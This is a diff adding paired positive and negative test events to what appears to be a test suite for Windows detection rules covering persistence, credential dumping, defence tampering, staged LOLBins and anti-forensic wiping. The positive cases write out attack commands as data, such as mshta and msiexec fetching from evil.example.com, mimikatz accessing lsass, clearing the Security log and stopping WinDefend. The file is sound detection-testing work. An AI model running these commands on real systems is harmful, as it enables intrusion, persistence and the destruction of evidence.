@@ -884,6 +884,251 @@ CASES = [
             Description="Some legit installer",
         ),
     ),
+    # --- SYS-093 through SYS-107: added in a coverage-expansion pass covering
+    # techniques the corpus had no rule for at all (scheduled tasks, service
+    # creation, remote-thread injection, firewall/log/AV tampering, staged
+    # LOLBins, anti-forensic wiping, RDP enablement). ---
+    (
+        "SYS-093",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\schtasks.exe",
+            command_line=r"schtasks /create /tn Updater /tr "
+            r"C:\Users\bob\AppData\Roaming\u.exe /sc onlogon",
+        ),
+    ),
+    (
+        "SYS-093",
+        False,
+        event(1, image=r"C:\Windows\System32\schtasks.exe", command_line="schtasks /query"),
+    ),
+    (
+        "SYS-094",
+        True,
+        event(
+            13,
+            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
+            Details=r"C:\Users\bob\AppData\Local\Temp\svc.exe",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-094",
+        False,
+        event(
+            13,
+            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\Spooler\ImagePath",
+            Details=r"C:\Windows\System32\spoolsv.exe",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-095",
+        True,
+        event(8, image=r"C:\Users\bob\mimikatz.exe", TargetImage=r"C:\Windows\System32\lsass.exe"),
+    ),
+    (
+        "SYS-095",
+        False,
+        event(8, image=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\explorer.exe"),
+    ),
+    (
+        "SYS-096",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\netsh.exe",
+            command_line="netsh advfirewall firewall add rule name=Svc dir=in "
+            "action=allow protocol=TCP localport=4444",
+        ),
+    ),
+    (
+        "SYS-096",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\netsh.exe",
+            command_line="netsh advfirewall firewall add rule name=Svc dir=in "
+            "action=block protocol=TCP localport=4444",
+        ),
+    ),
+    (
+        "SYS-097",
+        True,
+        event(1, image=r"C:\Windows\System32\wevtutil.exe", command_line="wevtutil cl Security"),
+    ),
+    (
+        "SYS-097",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\wevtutil.exe",
+            command_line="wevtutil qe Security /f:text",
+        ),
+    ),
+    (
+        "SYS-098",
+        True,
+        event(
+            1,
+            image=r"C:\Program Files\WinRAR\rar.exe",
+            command_line=r"rar a -pSecret123 archive.rar C:\Users\bob\Documents",
+        ),
+    ),
+    (
+        "SYS-098",
+        False,
+        event(
+            1,
+            image=r"C:\Program Files\WinRAR\rar.exe",
+            command_line=r"rar a archive.rar C:\Users\bob\Documents",
+        ),
+    ),
+    (
+        "SYS-099",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
+            command_line=r"InstallUtil.exe C:\Users\bob\AppData\Local\Temp\payload.dll",
+        ),
+    ),
+    (
+        "SYS-099",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
+            command_line=r"InstallUtil.exe C:\Program Files\MyApp\MyApp.exe",
+        ),
+    ),
+    (
+        "SYS-100",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\mshta.exe",
+            command_line="mshta.exe http://evil.example.com/a.hta",
+        ),
+    ),
+    (
+        "SYS-100",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\mshta.exe",
+            command_line=r"mshta.exe C:\Users\bob\Documents\local.hta",
+        ),
+    ),
+    (
+        "SYS-101",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\hh.exe",
+            command_line=r"hh.exe C:\Users\bob\AppData\Local\Temp\malicious.chm",
+        ),
+    ),
+    (
+        "SYS-101",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\hh.exe",
+            command_line=r"hh.exe C:\Windows\Help\mui\0409\ntbackup.chm",
+        ),
+    ),
+    (
+        "SYS-102",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\msiexec.exe",
+            command_line="msiexec /i http://evil.example.com/pkg.msi",
+        ),
+    ),
+    (
+        "SYS-102",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\msiexec.exe",
+            command_line=r"msiexec /i C:\Installers\pkg.msi",
+        ),
+    ),
+    (
+        "SYS-103",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\net.exe",
+            command_line="net localgroup administrators bob /add",
+        ),
+    ),
+    (
+        "SYS-103",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\net.exe",
+            command_line="net localgroup Users bob /add",
+        ),
+    ),
+    (
+        "SYS-104",
+        True,
+        event(1, image=r"C:\Windows\System32\sc.exe", command_line="sc stop WinDefend"),
+    ),
+    (
+        "SYS-104",
+        False,
+        event(1, image=r"C:\Windows\System32\sc.exe", command_line="sc stop Spooler"),
+    ),
+    (
+        "SYS-105",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\Downloads\sdelete64.exe",
+            command_line=r"sdelete64.exe -p 3 C:\evidence.txt",
+        ),
+    ),
+    (
+        "SYS-105",
+        False,
+        event(1, image=r"C:\Windows\System32\notepad.exe", command_line="notepad.exe"),
+    ),
+    (
+        "SYS-106",
+        True,
+        event(1, image=r"C:\Windows\System32\cipher.exe", command_line=r"cipher /w:C:\Temp"),
+    ),
+    (
+        "SYS-106",
+        False,
+        event(1, image=r"C:\Windows\System32\cipher.exe", command_line=r"cipher /e C:\Secret"),
+    ),
+    (
+        "SYS-107",
+        True,
+        event(
+            13,
+            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
+            Details="DWORD (0x00000000)",
+            EventType="SetValue",
+        ),
+    ),
+    (
+        "SYS-107",
+        False,
+        event(
+            13,
+            TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
+            Details="DWORD (0x00000001)",
+            EventType="SetValue",
+        ),
+    ),
 ]
 
 
